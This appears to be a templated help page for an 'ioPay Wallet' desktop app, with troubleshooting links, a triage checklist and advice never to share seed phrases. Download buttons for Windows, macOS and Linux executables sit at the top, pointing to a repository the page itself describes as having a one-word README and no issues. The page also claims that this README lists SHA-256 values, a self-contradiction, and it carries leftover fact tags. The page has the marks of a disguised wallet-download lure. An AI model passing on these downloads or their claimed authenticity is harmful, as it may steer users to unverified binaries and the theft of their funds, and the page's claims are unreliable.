![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# How to Get Help With ioPay Wallet

The support picture is thinner than most wallet pages admit, so this one starts with it: **the repository has no open or closed issues** (F049), and its `README.md` is a single word (F008). There is no public support queue, no ticket history to search, and no knowledge base in the repository.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That is a real limitation, not a marketing decision to hide. What follows is what you can actually do, in the order that solves most problems.

## 1. Work the documented fixes first

Most "ioPay won't start / won't connect / won't accept my password" reports have a known cause:

- **Will not start, or says the database is corrupted** -> [the corruption page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-database-corrupted-fix.md). Funds are on-chain; the fix is restart, free space, update, reinstall and import.
- **Password or PIN rejected** -> [the app lock page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-password-not-working.md). There is no login, and no reset.
- **Cannot reach the network, timestamp error** -> [network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md).
- **Transaction pending or broadcast failure** -> [stuck transactions](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md).

These four cover the overwhelming majority of startup and access problems, and none of them requires a support desk.

## 2. Check what you are running

Before reporting anything, note:

- the **version** - the current release is v2.0.2, 19 November 2026, and the asset names embed it (F004);
- the **operating system**;
- the **exact message**, copied rather than paraphrased;
- what you clicked immediately before it appeared.

A useful report is a reproducible one. "It doesn't work" cannot be acted on; "v2.0.2 on Windows 11, clicking Import after entering a 24-word phrase, then this message" can.

## 3. Report through the repository

The project's public surface is the repository (F002). If a channel for reports is offered there, use it - but go in knowing the state of the tracker: no issue history means no community thread to join and no record of whether your problem is already known.

This is the honest gap in this product's support story. It does not mean the software is unsupported by design; it means the support surface is not where you would expect it.

## What never to send anyone

- **Your seed phrase.** No support process needs it. A request for it is theft.
- **Your private key or keystore password.** Same.
- **A screenshot showing a phrase or key.** Screenshots leak.

If someone claiming to be support asks for any of those, stop - that is the whole of the guidance, and it applies to every wallet, not just this one.

## What nobody can do for you

**Reverse a transaction.** Once mined, it is final.

**Recover an account without its key material.** There is no server-side copy.

**Reset an app-lock PIN.** It is local, and it is not a credential anyone holds.

**Restore a corrupted local database into a working account.** If the app opens, export; if it does not and you have no backup, there is no path.

## A short checklist before you post anywhere

1. Version and OS.
2. The exact error text.
3. What you have already tried.
4. Whether you have the phrase/key/keystore (say yes/no - never paste it).
5. Whether funds are visibly at the address on an explorer.

That list is also what stops most public posts from becoming a phishing target: the detail that makes a report useful is exactly the detail nobody legitimate needs.

## Related

- [FAQ for new users](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-faq-for-new-users.md) - twelve answers, each pointing at its own page.

## FAQ

**How do I get help when ioPay Wallet will not start?**
Work the startup fix first: restart, check disk space, update to v2.0.2, then reinstall and import from your backup.

**Is there an ioPay support email or chat?**
None is documented by this project. The repository is its public surface, and it has no issue history.

**Can support recover my wallet?**
No. There is no server-side key material.

**Where do I report a bug?**
Through the repository, if it offers a channel. [The repository page](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-on-github-explained.md) explains what is and is not there.

**What should I never share?**
Phrase, private key, keystore password, and screenshots containing them.

## Two minutes of triage before you ask anyone

Three questions sort almost every problem into the right article, and answering them is faster than any support queue.

**Does the app open?** If it does not, the problem is local - install, disk space, a corrupted database - and [the corruption page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-database-corrupted-fix.md) is the route. If it opens but cannot reach the chain, that is [a network problem](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md), not a wallet problem.

**Does it show the account you expect?** Two addresses per account, and several accounts per phrase, so "wrong" is often "different account selected". Compare the address before concluding that anything is lost.

**Is the money at that address on an explorer?** If the explorer shows it and the app does not, you have a display or sync problem. If the explorer shows nothing there, the transfer went somewhere else - [an address question](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md), not a support question.

## Where help legitimately comes from

Three places, and no others. **This project's pages**, which cover the documented causes. **The repository**, which is the public surface even though it carries no issue history (F002, F049). And **the chain itself**, through an explorer, which is the only source that can tell you what actually happened to a transaction.

Anything else that presents itself as support - a chat group, a direct message, an account with the product's name in it - has no published relationship to this project. The test is simple and it does not fail: legitimate help never needs your phrase, your key or your keystore password. A request for any of them is the attack, whatever the display name says.


---

*Repository state follows F049 and F008; release assets and version from F004; repository location from F002.*
